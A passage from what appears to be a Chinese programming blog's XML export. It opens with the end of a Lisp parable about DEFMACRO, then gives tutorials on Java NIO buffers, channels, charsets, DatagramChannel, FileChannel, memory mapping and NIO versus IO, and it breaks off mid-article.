<p>走投无路之下，老板雇用了一个初级程序员Mac。他的工作就是找到这些注释，编写所需的代码，然后再用其替换掉程序中的注释。Mac从未运行过这些程序，程序尚未完成，他当然运行不了。但就算这些程序完成了，不知道该用怎样的输入来运行它们。因此，他只是基于注释的内容来编写他的代码，再将其发还给最初的程序员。</p>
<p>在Mac的帮助下，不久之后，所有的程序都完成了，公司通过销售它们赚了很多钱，并用这些钱将其程序员团队扩大了一倍。但不知为何，没有人想到要雇用其他人来帮助Mac。很快他就开始单枪匹马地同时协助几十个程序员了。为了避免将他所有的时间都花在捜索裸代码的注释上，Mac对程序员们使用的编译器做了一个小小的更改。从那以后，只要编译器遇到一个注释，它就会将注释以电子邮件的形式发给他并等待他将替换的代码传送回来。然而，就算有了这个变化，Mac也很难跟上程序员的进度。他尽可能小心地工作，伹有时，尤其是当注释不够清楚时，他会犯错误。</p>
<p>不过程序员们注意到了，他们将注释写得越精确，Mac就越有可能发回正确的代码。一天，一个花费大量时间用文字来描述他想要的代码的程序员，在他的注释里写入了一个可以生成他想要的代码的Lisp程序，这对Mac来说很简单，他只要运行这个程序并将结果发给编译器就好了。</p>
<p>接下来又出现了一种创新。有一个程序员在他程序的开始处写了一段备注，其中含有一个函数定义以及另一个注释，该注释为：“Mac，不要在这里写任何代码，但要把这个函数留给以后使用，我将在我的其他一些注释里用到它。”同一个程序里还有如下的注释：“Mac,将这个注释替换成用符号x和y作为参数来运行上面提到的那个函数所得到的结果。”</p>
<p>这项技术在几天里就迅速流行起来，多数程序都含有数十个注释，它们定义了那些只被其他注释中的代码所使用的函数。为了使Mac更容易地辨别那些只含有定义而不必立即回复的注释，程序员们用一个标准前缀来标记它们：“给Mac的定义，仅供阅读。”（Definition for Mac, Readonly.)由于程序员们仍然很懶情，这个写法很快简化成“DEF. MAC. R&#x2F;O”，接着又被简化为“DEFMACRO”。</p>
<p>不久以后，这些給Mac的注释中再没有实际可读的英语了。Mac每天要做的亊情就是阅读并反馈那些来自编译器的含有DEFMACRO注释的电子邮件，以及调用那些DEFMACRO里所定义的函数。由于注释中的Lisp程序做了所有实际的工作，跟上这些电子邮件的进度完全没有问题。</p>
<p>Mac手头上突然有了大量时间，可以坐在他的办公室里做关于白色沙滩，蓝色海水和鸡尾酒的白日梦了，几个月以后，程序员们意识到已经很长时间没人见过Mac了。当他们去他的办公室时，发现 所有东西上都积了薄薄的一层灰，一个桌子上还放着几本热带地区的旅行手册，而电脑则是关着的。但是编译器仍在正常工作，这怎么可能？看起来Mac对编译器做了最后一个修改：现在不需要用电子邮件将注释发给Mac了，编译器会将那些DEFMACRO中所定义的函数保存下来，并在其被其他注释调用时运行它们。程序员们觉得没有理由吿诉老板Mac不再来办公室了，因此直到今天，Mac还领若薪水，并且时不时地会从某个热带地区给程序员们发一张明信片。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Lisp</category>
      </categories>
      <tags>
        <tag>Lisp</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO之Buffer</title>
    <url>/blog/plang/java/nio/buffer/</url>
    <content><![CDATA[<p>Java NIO中的Buffer用于和NIO通道进行交互。如你所知，数据是从通道读入缓冲区，从缓冲区写入到通道中的。</p>
<p>缓冲区本质上是一块可以写入数据，然后可以从中读取数据的内存。这块内存被包装成NIO Buffer对象，并提供了一组方法，用来方便的访问该块内存。</p>
<p>下面是NIO Buffer相关的话题列表：</p>
<p>[TOC]</p>
<h3 id="Buffer的基本用法"><a href="#Buffer的基本用法" class="headerlink" title="Buffer的基本用法"></a>Buffer的基本用法</h3><p>使用Buffer读写数据一般遵循以下四个步骤：</p>
<ol>
<li>写入数据到Buffer</li>
<li>调用<code>flip()</code>方法</li>
<li>从Buffer中读取数据</li>
<li>调用<code>clear()</code>方法或者<code>compact()</code>方法</li>
</ol>
<p>当向buffer写入数据时，buffer会记录下写了多少数据。一旦要读取数据，需要通过flip()方法将Buffer从写模式切换到读模式。在读模式下，可以读取之前写入到buffer的所有数据。</p>
<p>一旦读完了所有的数据，就需要清空缓冲区，让它可以再次被写入。有两种方式能清空缓冲区：调用clear()或compact()方法。clear()方法会清空整个缓冲区。compact()方法只会清除已经读过的数据。任何未读的数据都被移到缓冲区的起始处，新写入的数据将放到缓冲区未读数据的后面。</p>
<p>下面是一个使用Buffer的例子：</p>
<pre><code>RandomAccessFile aFile = new RandomAccessFile(&quot;data/nio-data.txt&quot;, &quot;rw&quot;);
FileChannel inChannel = aFile.getChannel();

//create buffer with capacity of 48 bytes
ByteBuffer buf = ByteBuffer.allocate(48);

int bytesRead = inChannel.read(buf); //read into buffer.
while (bytesRead != -1) &#123;

  buf.flip();  //make buffer ready for read

  while(buf.hasRemaining())&#123;
      System.out.print((char) buf.get()); // read 1 byte at a time
  &#125;

  buf.clear(); //make buffer ready for writing
  bytesRead = inChannel.read(buf);
&#125;
aFile.close();
</code></pre>
<h3 id="Buffer的capacity-position和limit"><a href="#Buffer的capacity-position和limit" class="headerlink" title="Buffer的capacity,position和limit"></a>Buffer的capacity,position和limit</h3><p>缓冲区本质上是一块可以写入数据，然后可以从中读取数据的内存。这块内存被包装成NIO Buffer对象，并提供了一组方法，用来方便的访问该块内存。</p>
<p>为了理解Buffer的工作原理，需要熟悉它的三个属性：</p>
<ul>
<li>capacity</li>
<li>position</li>
<li>limit</li>
</ul>
<p>position和limit的含义取决于Buffer处在读模式还是写模式。不管Buffer处在什么模式，capacity的含义总是一样的。</p>
<p>这里有一个关于capacity，position和limit在读写模式中的说明，详细的解释在插图后面。</p>
<p><img src="/images/java/niobuffer.png"></p>
<h4 id="capacity"><a href="#capacity" class="headerlink" title="capacity"></a>capacity</h4><p>作为一个内存块，Buffer有一个固定的大小值，也叫“capacity”.你只能往里写capacity个byte、long，char等类型。一旦Buffer满了，需要将其清空（通过读数据或者清除数据）才能继续写数据往里写数据。</p>
<h4 id="position"><a href="#position" class="headerlink" title="position"></a>position</h4><p>当你写数据到Buffer中时，position表示当前的位置。初始的position值为0.当一个byte、long等数据写到Buffer后，position会向前移动到下一个可插入数据的Buffer单元。position最大可为capacity– 1.</p>
<p>当读取数据时，也是从某个特定位置读。当将Buffer从写模式切换到读模式，position会被重置为0.</p>
<p>当从Buffer的position处读取数据时，position向前移动到下一个可读的位置。</p>
<h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>在写模式下，Buffer的limit表示你最多能往Buffer里写多少数据。</p>
<p>写模式下，limit等于Buffer的capacity。</p>
<p>当切换Buffer到读模式时，limit表示你最多能读到多少数据。因此，当切换Buffer到读模式时，limit会被设置成写模式下的position值。换句话说，你能读到之前写入的所有数据（limit被设置成已写数据的数量，这个值在写模式下就是position）</p>
<h3 id="Buffer的类型"><a href="#Buffer的类型" class="headerlink" title="Buffer的类型"></a>Buffer的类型</h3><p>Java NIO 有以下Buffer类型</p>
<ul>
<li>ByteBuffer</li>
<li>MappedByteBuffer</li>
<li>CharBuffer</li>
<li>DoubleBuffer</li>
<li>FloatBuffer</li>
<li>IntBuffer</li>
<li>LongBuffer</li>
<li>ShortBuffer</li>
</ul>
<p>如你所见，这些Buffer类型代表了不同的数据类型。换句话说，就是可以通过char，short，int，long，float或 double类型来操作缓冲区中的字节。</p>
<p>MappedByteBuffer 有些特别，在涉及它的专门章节中再讲。</p>
<h3 id="Buffer的分配"><a href="#Buffer的分配" class="headerlink" title="Buffer的分配"></a>Buffer的分配</h3><p>要想获得一个Buffer对象首先要进行分配。</p>
<p>每一个Buffer类都有一个allocate方法。下面是一个分配48字节capacity的ByteBuffer的例子。</p>
<pre><code>ByteBuffer buf = ByteBuffer.allocate(48);
</code></pre>
<p>这是分配一个可存储1024个字符的CharBuffer：</p>
<pre><code>CharBuffer buf = CharBuffer.allocate(1024);
</code></pre>
<h3 id="向Buffer中写数据"><a href="#向Buffer中写数据" class="headerlink" title="向Buffer中写数据"></a>向Buffer中写数据</h3><p>写数据到Buffer有两种方式：</p>
<ul>
<li>从Channel写到Buffer。</li>
<li>通过Buffer的put()方法写到Buffer里。</li>
</ul>
<p>从Channel写到Buffer的例子</p>
<pre><code>int bytesRead = inChannel.read(buf); //read into buffer.
</code></pre>
<p>通过put方法写Buffer的例子：</p>
<pre><code>buf.put(127);
</code></pre>
<p>put方法有很多版本，允许你以不同的方式把数据写入到Buffer中。例如，写到一个指定的位置，或者把一个字节数组写入到Buffer。</p>
<p>更多Buffer实现的细节参考JavaDoc。</p>
<h4 id="flip-方法"><a href="#flip-方法" class="headerlink" title="flip()方法"></a>flip()方法</h4><p>flip方法将Buffer从写模式切换到读模式。调用flip()方法会将position设回0，并将limit设置成之前position的值。</p>
<p>换句话说，position现在用于标记读的位置，limit表示之前写进了多少个byte、char等—— 现在能读取多少个byte、char等。</p>
<h3 id="从Buffer中读取数据"><a href="#从Buffer中读取数据" class="headerlink" title="从Buffer中读取数据"></a>从Buffer中读取数据</h3><p>从Buffer中读取数据有两种方式：</p>
<ol>
<li>从Buffer读取数据到Channel。</li>
<li>使用get()方法从Buffer中读取数据。</li>
</ol>
<p>从Buffer读取数据到Channel的例子：</p>
<pre><code>//read from buffer into channel.
int bytesWritten = inChannel.write(buf);
</code></pre>
<p>使用get()方法从Buffer中读取数据的例子</p>
<pre><code>byte aByte = buf.get();
</code></pre>
<p>get方法有很多版本，允许你以不同的方式从Buffer中读取数据。例如，从指定position读取，或者从Buffer中读取数据到字节数组。更多Buffer实现的细节参考JavaDoc。</p>
<h3 id="rewind-方法"><a href="#rewind-方法" class="headerlink" title="rewind()方法"></a>rewind()方法</h3><p>Buffer.rewind()将position设回0，所以你可以重读Buffer中的所有数据。limit保持不变，仍然表示能从Buffer中读取多少个元素（byte、char等）。</p>
<h3 id="clear-与compact-方法"><a href="#clear-与compact-方法" class="headerlink" title="clear()与compact()方法"></a>clear()与compact()方法</h3><p>一旦读完Buffer中的数据，需要让Buffer准备好再次被写入。可以通过clear()或compact()方法来完成。</p>
<p>如果调用的是clear()方法，position将被设回0，limit被设置成capacity的值。换句话说，Buffer被清空了。Buffer中的数据并未清除，只是这些标记告诉我们可以从哪里开始往Buffer里写数据。</p>
<p>如果Buffer中有一些未读的数据，调用clear()方法，数据将“被遗忘”，意味着不再有任何标记会告诉你哪些数据被读过，哪些还没有。</p>
<p>如果Buffer中仍有未读的数据，且后续还需要这些数据，但是此时想要先先写些数据，那么使用compact()方法。</p>
<p>compact()方法将所有未读的数据拷贝到Buffer起始处。然后将position设到最后一个未读元素正后面。limit属性依然像clear()方法一样，设置成capacity。现在Buffer准备好写数据了，但是不会覆盖未读的数据。</p>
<h3 id="mark-与reset-方法"><a href="#mark-与reset-方法" class="headerlink" title="mark()与reset()方法"></a>mark()与reset()方法</h3><p>通过调用Buffer.mark()方法，可以标记Buffer中的一个特定position。之后可以通过调用Buffer.reset()方法恢复到这个position。例如：</p>
<pre><code>buffer.mark();

//call buffer.get() a couple of times, e.g. during parsing.

buffer.reset();  //set position back to mark.
</code></pre>
<h3 id="equals-与compareTo-方法"><a href="#equals-与compareTo-方法" class="headerlink" title="equals()与compareTo()方法"></a>equals()与compareTo()方法</h3><p>可以使用equals()和compareTo()方法两个Buffer。</p>
<h4 id="equals"><a href="#equals" class="headerlink" title="equals()"></a>equals()</h4><p>当满足下列条件时，表示两个Buffer相等：</p>
<ol>
<li>有相同的类型（byte、char、int等）。</li>
<li>Buffer中剩余的byte、char等的个数相等。</li>
<li>Buffer中所有剩余的byte、char等都相同。</li>
</ol>
<p>如你所见，equals只是比较Buffer的一部分，不是每一个在它里面的元素都比较。实际上，它只比较Buffer中的剩余元素。</p>
<h4 id="compareTo-方法"><a href="#compareTo-方法" class="headerlink" title="compareTo()方法"></a>compareTo()方法</h4><p>compareTo()方法比较两个Buffer的剩余元素(byte、char等)，如果满足下列条件，则认为一个Buffer“小于”另一个Buffer：</p>
<ol>
<li>第一个不相等的元素小于另一个Buffer中对应的元素 。</li>
<li>所有元素都相等，但第一个Buffer比另一个先耗尽(第一个Buffer的元素个数比另一个少)。</li>
</ol>
<p><em>（译注：剩余元素是从 position到limit之间的元素）</em></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO之Channel</title>
    <url>/blog/plang/java/nio/channel/</url>
    <content><![CDATA[<p>Java NIO的通道类似流，但又有些不同：</p>
<ul>
<li>既可以从通道中读取数据，又可以写数据到通道。但流的读写通常是单向的。</li>
<li>通道可以异步地读写。</li>
<li>通道中的数据总是要先读到一个Buffer，或者总是要从一个Buffer中写入。</li>
</ul>
<p>正如上面所说，从通道读取数据到缓冲区，从缓冲区写入数据到通道。</p>
<h3 id="Channel的实现"><a href="#Channel的实现" class="headerlink" title="Channel的实现"></a>Channel的实现</h3><p>这些是Java NIO中最重要的通道的实现：</p>
<ul>
<li>FileChannel</li>
<li>DatagramChannel</li>
<li>SocketChannel</li>
<li>ServerSocketChannel</li>
</ul>
<p>FileChannel 从文件中读写数据。</p>
<p>DatagramChannel 能通过UDP读写网络中的数据。</p>
<p>SocketChannel 能通过TCP读写网络中的数据。</p>
<p>ServerSocketChannel可以监听新进来的TCP连接，像Web服务器那样。对每一个新进来的连接都会创建一个SocketChannel。</p>
<h3 id="基本的-Channel-示例"><a href="#基本的-Channel-示例" class="headerlink" title="基本的 Channel 示例"></a>基本的 Channel 示例</h3><p>下面是一个使用FileChannel读取数据到Buffer中的示例：</p>
<pre><code>RandomAccessFile aFile = new RandomAccessFile(&quot;data/nio-data.txt&quot;, &quot;rw&quot;);
FileChannel inChannel = aFile.getChannel();

ByteBuffer buf = ByteBuffer.allocate(48);

int bytesRead = inChannel.read(buf);
while (bytesRead != -1) &#123;

System.out.println(&quot;Read &quot; + bytesRead);
buf.flip();

while(buf.hasRemaining())&#123;
System.out.print((char) buf.get());
&#125;

buf.clear();
bytesRead = inChannel.read(buf);
&#125;
aFile.close();
</code></pre>
<p>注意 buf.flip()的调用，首先读取数据到Buffer，然后反转Buffer,接着再从Buffer中读取数据。下一节会深入讲解Buffer的更多细节。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO之Charset</title>
    <url>/blog/plang/java/nio/charset/</url>
    <content><![CDATA[<p>Java 语言被定义为基于Unicode。一个字符实体由二个字节表示（如果是用UCS-2）。但众多文件和数据流都是基于其它字符编码并以byte传输，操作文件内容就成了一个问题。</p>
<p>操作一个文件首先要对文件内容进行解码，文件内容是二进制数据（也可以认为是字节流），我们要把内容解码为JAVA可以理解的一个个字符（Unicode）。</p>
<p>修改完成后还要按输出编码把文件内容编码成对应的二进制内容，再输出到对应地点。</p>
<p>读取文件内容后要用CharBuffer做decode,才能获取字符内容CharBuffer。</p>
<p>在写文件之前要用CharsetEncoder做encode,才能获取对应字符编码的二进制内容ByteBuffer。</p>
<p>下面看一下例子：</p>
<pre><code>import java.io.*;
import java.nio.*;
import java.nio.channels.*;
import java.nio.charset.*;

public class UseCharsets
&#123;
  static public void main( String args[] ) throws Exception &#123;
    String inputFile = &quot;samplein.txt&quot;;
    String outputFile = &quot;sampleout.txt&quot;;

    RandomAccessFile inf = new RandomAccessFile( inputFile, &quot;r&quot; );
    RandomAccessFile outf = new RandomAccessFile( outputFile, &quot;rw&quot; );
    long inputLength = new File( inputFile ).length();

    FileChannel inc = inf.getChannel();
    FileChannel outc = outf.getChannel();

    MappedByteBuffer inputData =
      inc.map( FileChannel.MapMode.READ_ONLY, 0, inputLength );

    Charset latin1 = Charset.forName( &quot;ISO-8859-1&quot; );
    CharsetDecoder decoder = latin1.newDecoder();
    CharsetEncoder encoder = latin1.newEncoder();

    CharBuffer cb = decoder.decode( inputData );

    // Process char data here

    ByteBuffer outputData = encoder.encode( cb );

    outc.write( outputData );

    inf.close();
    outf.close();
  &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO之DatagramChannel</title>
    <url>/blog/plang/java/nio/datagramchannle/</url>
    <content><![CDATA[<p>Java NIO中的DatagramChannel是一个能收发UDP包的通道。因为UDP是无连接的网络协议，所以不能像其它通道那样读取和写入。它发送和接收的是数据包。</p>
<h3 id="打开-DatagramChannel"><a href="#打开-DatagramChannel" class="headerlink" title="打开 DatagramChannel"></a>打开 DatagramChannel</h3><p>下面是 DatagramChannel 的打开方式：</p>
<pre><code>DatagramChannel channel = DatagramChannel.open();
channel.socket().bind(new InetSocketAddress(9999));
</code></pre>
<p>这个例子打开的 DatagramChannel可以在UDP端口9999上接收数据包。</p>
<h3 id="接收数据"><a href="#接收数据" class="headerlink" title="接收数据"></a>接收数据</h3><p>通过receive()方法从DatagramChannel接收数据，如：</p>
<pre><code>ByteBuffer buf = ByteBuffer.allocate(48);
buf.clear();
channel.receive(buf);
</code></pre>
<p>receive()方法会将接收到的数据包内容复制到指定的Buffer.</p>
<p>如果Buffer容不下收到的数据，多出的数据将被丢弃。</p>
<h3 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h3><p>通过send()方法从DatagramChannel发送数据，如:</p>
<pre><code>String newData = &quot;New String to write to file...&quot; + System.currentTimeMillis();

ByteBuffer buf = ByteBuffer.allocate(48);
buf.clear();
buf.put(newData.getBytes());
buf.flip();

int bytesSent = channel.send(buf, new InetSocketAddress(&quot;jenkov.com&quot;, 80));
</code></pre>
<p>这个例子发送一串字符到”jenkov.com”服务器的UDP端口80。</p>
<p>因为服务端并没有监控这个端口，所以什么也不会发生。也不会通知你发出的数据包是否已收到，因为UDP在数据传送方面没有任何保证。</p>
<h3 id="连接到特定的地址"><a href="#连接到特定的地址" class="headerlink" title="连接到特定的地址"></a>连接到特定的地址</h3><p>可以将DatagramChannel“连接”到网络中的特定地址的。由于UDP是无连接的，连接到特定地址并不会像TCP通道那样创建一个真正的连接。而是锁住DatagramChannel，让其只能从特定地址收发数据。</p>
<p>这里有个例子:</p>
<pre><code>channel.connect(new InetSocketAddress(&quot;jenkov.com&quot;, 80));
</code></pre>
<p>当连接后，也可以使用read()和write()方法，就像在用传统的通道一样。只是在数据传送方面没有任何保证。这里有几个例子：</p>
<pre><code>int bytesRead = channel.read(buf);
int bytesWritten = channel.write(but);
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO之FileChannel</title>
    <url>/blog/plang/java/nio/filechannel/</url>
    <content><![CDATA[<p>Java NIO中的FileChannel是一个连接到文件的通道。可以通过文件通道读写文件。</p>
<p>FileChannel无法设置为非阻塞模式，它总是运行在阻塞模式下。</p>
<h3 id="打开FileChannel"><a href="#打开FileChannel" class="headerlink" title="打开FileChannel"></a>打开FileChannel</h3><p>在使用FileChannel之前，必须先打开它。但是，我们无法直接打开一个FileChannel，需要通过使用一个InputStream、OutputStream或RandomAccessFile来获取一个FileChannel实例。下面是通过RandomAccessFile打开FileChannel的示例：</p>
<pre><code>RandomAccessFile aFile = new RandomAccessFile(&quot;data/nio-data.txt&quot;, &quot;rw&quot;);
FileChannel inChannel = aFile.getChannel();
</code></pre>
<h3 id="从FileChannel读取数据"><a href="#从FileChannel读取数据" class="headerlink" title="从FileChannel读取数据"></a>从FileChannel读取数据</h3><p>调用多个read()方法之一从FileChannel中读取数据。如：</p>
<pre><code>ByteBuffer buf = ByteBuffer.allocate(48);
int bytesRead = inChannel.read(buf);
</code></pre>
<p>首先，分配一个Buffer。从FileChannel中读取的数据将被读到Buffer中。</p>
<p>然后，调用FileChannel.read()方法。该方法将数据从FileChannel读取到Buffer中。read()方法返回的int值表示了有多少字节被读到了Buffer中。如果返回-1，表示到了文件末尾。</p>
<h3 id="向FileChannel写数据"><a href="#向FileChannel写数据" class="headerlink" title="向FileChannel写数据"></a>向FileChannel写数据</h3><p>使用FileChannel.write()方法向FileChannel写数据，该方法的参数是一个Buffer。如：</p>
<pre><code>String newData = &quot;New String to write to file...&quot; + System.currentTimeMillis();

ByteBuffer buf = ByteBuffer.allocate(48);
buf.clear();
buf.put(newData.getBytes());

buf.flip();

while(buf.hasRemaining()) &#123;
    channel.write(buf);
&#125;
</code></pre>
<p>注意FileChannel.write()是在while循环中调用的。因为无法保证write()方法一次能向FileChannel写入多少字节，因此需要重复调用write()方法，直到Buffer中已经没有尚未写入通道的字节。</p>
<h3 id="关闭FileChannel"><a href="#关闭FileChannel" class="headerlink" title="关闭FileChannel"></a>关闭FileChannel</h3><p>用完FileChannel后必须将其关闭。如：</p>
<pre><code>channel.close();
</code></pre>
<h3 id="FileChannel的position方法"><a href="#FileChannel的position方法" class="headerlink" title="FileChannel的position方法"></a>FileChannel的position方法</h3><p>有时可能需要在FileChannel的某个特定位置进行数据的读&#x2F;写操作。可以通过调用position()方法获取FileChannel的当前位置。</p>
<p>也可以通过调用position(long pos)方法设置FileChannel的当前位置。</p>
<p>这里有两个例子:</p>
<pre><code>long pos = channel.position();
channel.position(pos +123);
</code></pre>
<p>如果将位置设置在文件结束符之后，然后试图从文件通道中读取数据，读方法将返回-1—— 文件结束标志。</p>
<p>如果将位置设置在文件结束符之后，然后向通道中写数据，文件将撑大到当前位置并写入数据。这可能导致“文件空洞”，磁盘上物理文件中写入的数据间有空隙。</p>
<h3 id="FileChannel的size方法"><a href="#FileChannel的size方法" class="headerlink" title="FileChannel的size方法"></a>FileChannel的size方法</h3><p>FileChannel实例的size()方法将返回该实例所关联文件的大小。如:</p>
<pre><code>long fileSize = channel.size();
</code></pre>
<h3 id="FileChannel的truncate方法"><a href="#FileChannel的truncate方法" class="headerlink" title="FileChannel的truncate方法"></a>FileChannel的truncate方法</h3><p>可以使用FileChannel.truncate()方法截取一个文件。截取文件时，文件将中指定长度后面的部分将被删除。如：</p>
<pre><code>channel.truncate(1024);
</code></pre>
<p>这个例子截取文件的前1024个字节。</p>
<h3 id="FileChannel的force方法"><a href="#FileChannel的force方法" class="headerlink" title="FileChannel的force方法"></a>FileChannel的force方法</h3><p>FileChannel.force()方法将通道里尚未写入磁盘的数据强制写到磁盘上。出于性能方面的考虑，操作系统会将数据缓存在内存中，所以无法保证写入到FileChannel里的数据一定会即时写到磁盘上。要保证这一点，需要调用force()方法。</p>
<p>force()方法有一个boolean类型的参数，指明是否同时将文件元数据（权限信息等）写到磁盘上。</p>
<p>下面的例子同时将文件数据和元数据强制写到磁盘上：</p>
<pre><code>channel.force(true);
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO之内存映射（memory mapping）</title>
    <url>/blog/plang/java/nio/memmap/</url>
    <content><![CDATA[<p>NIO里对性能提升最显著的是内存映射（memory mapping）。内存映射是一个系统层面的服务，它把程序里用到的文件的一段当作内存来处理。</p>
<p>内存映射存在很多潜在的影响，比我这里提供的要多。在一个更高的层次上，它能够使得文件访问的I&#x2F;O的性能达到内存访问的速度。内存访问的速度往往比文件访问的速度快几个数量级。一个NIO内存映射的一个简单示例。</p>
<pre><code>import java.io.RandomAccessFile; 
 import java.nio.MappedByteBuffer; 
 import java.nio.channels.FileChannel; 
  
   public class mem_map_example &#123; 
     private static int mem_map_size = 20 * 1024 * 1024; 
     private static String fn = &quot;example_memory_mapped_file.txt&quot;; 
  
     public static void main(String[] args) throws Exception &#123; 
         RandomAccessFile memoryMappedFile = new RandomAccessFile(fn, &quot;rw&quot;); 
  
         //Mapping a file into memory 
         MappedByteBuffer out = memoryMappedFile.getChannel().map(FileChannel.MapMode.READ_WRITE, 0, mem_map_size); 
  
         //Writing into Memory Mapped File 
         for (int i = 0; i &lt; mem_map_size; i++) &#123; 
             out.put((byte) &#39;A&#39;); 
         &#125; 
         System.out.println(&quot;File &#39;&quot; + fn + &quot;&#39; is now &quot; + Integer.toString(mem_map_size) + &quot; bytes full.&quot;); 
  
         // Read from memory-mapped file. 
         for (int i = 0; i &lt; 30 ; i++) &#123; 
             System.out.print((char) out.get(i)); 
         &#125; 
         System.out.println(&quot;\nReading from memory-mapped file &#39;&quot; + fn + &quot;&#39; is complete.&quot;); 
     &#125; 
 &#125;
</code></pre>
<p>这个简单的示例创建了一个20M的文件example_memory_mapped_file.txt，并且用字符A对它进行填充，然后读取前30个字节。在实际的应用中，内存映射不仅仅擅长提高I&#x2F;O的原始速度，同时它也允许多个不同的reader和writer同时处理同一个文件镜像。这个技术功能强大但是也很危险，不过如果正确使用的话，它会使得你的IO速度提高数倍。众所周知，华尔街的交易操作为了能够赢得秒级甚至是毫秒级的优势，都使用了内存映射技术。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO 与IO</title>
    <url>/blog/plang/java/nio/niovsio/</url>
    <content><![CDATA[<p>当学习了Java NIO和IO的API后，一个问题马上涌入脑海：</p>
<p>我应该何时使用IO，何时使用NIO呢？在本文中，我会尽量清晰地解析Java NIO和IO的差异、它们的使用场景，以及它们如何影响您的代码设计。</p>
<h2 id="Java-NIO和IO的主要区别"><a href="#Java-NIO和IO的主要区别" class="headerlink" title="Java NIO和IO的主要区别"></a>Java NIO和IO的主要区别</h2><p>下表总结了Java NIO和IO之间的主要差别，我会更详细地描述表中每部分的差异。</p>
<table>
<thead>
<tr>
<th>IO? ? ? ?</th>
<th>? ? ? NIO</th>
</tr>
</thead>
<tbody><tr>
<td>面向流 ? ? ?</td>
<td>? ?面向缓冲</td>
</tr>
<tr>
<td>阻塞IO ? ? ?</td>
<td>? ?  非阻塞IO</td>
</tr>
<tr>
<td>无</td>
<td>选择器</td>
</tr>
</tbody></table>
<h2 id="面向流与面向缓冲"><a href="#面向流与面向缓冲" class="headerlink" title="面向流与面向缓冲"></a>面向流与面向缓冲</h2><p>Java NIO和IO之间第一个最大的区别是，IO是面向流的，NIO是面向缓冲区的。?Java IO面向流意味着每次从流中读一个或多个字节，直至读取所有字节，它们没有被缓存在任何地方。此外，它不能前后移动流中的数据。如果需要前后移动从流中读取的数据，需要先将它缓存到一个缓冲区。</p>
<p>Java NIO的缓冲导向方法略有不同。数据读取到一个它稍后处理的缓冲区，需要时可在缓冲区中前后移动。这就增加了处理过程中的灵活性。但是，还需要检查是否该缓冲区中包含所有您需要处理的数据。而且，需确保当更多的数据读入缓冲区时，不要覆盖缓冲区里尚未处理的数据。</p>
<h2 id="阻塞与非阻塞IO"><a href="#阻塞与非阻塞IO" class="headerlink" title="阻塞与非阻塞IO"></a>阻塞与非阻塞IO</h2><p>Java IO的各种流是阻塞的。这意味着，当一个线程调用read() 或write()时，该线程被阻塞，直到有一些数据被读取，或数据完全写入。该线程在此期间不能再干任何事情了。</p>
<p>Java NIO的非阻塞模式，使一个线程从某通道发送请求读取数据，但是它仅能得到目前可用的数据，如果目前没有数据可用时，就什么都不会获取。而不是保持线程阻塞，所以直至数据变的可以读取之前，该线程可以继续做其他的事情。</p>
<p>非阻塞写也是如此。一个线程请求写入一些数据到某通道，但不需要等待它完全写入，这个线程同时可以去做别的事情。</p>
<p>线程通常将非阻塞IO的空闲时间用于在其它通道上执行IO操作，所以一个单独的线程现在可以管理多个输入和输出通道（channel）。</p>
<h2 id="选择器（Selectors）"><a href="#选择器（Selectors）" class="headerlink" title="选择器（Selectors）"></a>选择器（Selectors）</h2><p>Java NIO的选择器允许一个单独的线程来监视多个输入通道，你可以注册多个通道使用一个选择器，然后使用一个单独的线程来“选择”通道：这些通道里已经有可以处理的输入，或者选择已准备写入的通道。这种选择机制，使得一个单独的线程很容易来管理多个通道。</p>
<h2 id="NIO和IO如何影响应用程序的设计"><a href="#NIO和IO如何影响应用程序的设计" class="headerlink" title="NIO和IO如何影响应用程序的设计"></a>NIO和IO如何影响应用程序的设计</h2><p>无论您选择IO或NIO工具箱，可能会影响您应用程序设计的以下几个方面：</p>
<ol>
<li>?对NIO或IO类的API调用。</li>
<li>数据处理。</li>
<li>用来处理数据的线程数。</li>
</ol>
<h2 id="API调用"><a href="#API调用" class="headerlink" title="API调用"></a><strong>API调用</strong></h2><p>当然，使用NIO的API调用时看起来与使用IO时有所不同，但这并不意外，因为并不是仅从一个InputStream逐字节读取，而是数据必须先读入缓冲区再处理。</p>
<h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a><strong>数据处理</strong></h2><p>使用纯粹的NIO设计相较IO设计，数据处理也受到影响。</p>
<p>在IO设计中，我们从InputStream或Reader逐字节读取数据。假设你正在处理一基于行的文本数据流，例如：</p>
<pre><code>Name: Anna
Age: 25
Email: anna@mailserver.com
Phone: 1234567890
</code></pre>
<p>该文本行的流可以这样处理：</p>
<pre><code>InputStream input = … ; // get the InputStream from the client socket
BufferedReader reader = new BufferedReader(new InputStreamReader(input));
String nameLine   = reader.readLine();
String ageLine    = reader.readLine();
String emailLine  = reader.readLine();
String phoneLine  = reader.readLine();
</code></pre>
<p>请注意处理状态由程序执行多久决定。换句话说，一旦reader.readLine()方法返回，你就知道肯定文本行就已读完，readline()阻塞直到整行读完，这就是原因。你也知道此行包含名称；同样，第二个readline()调用返回的时候，你知道这行包含年龄等。</p>
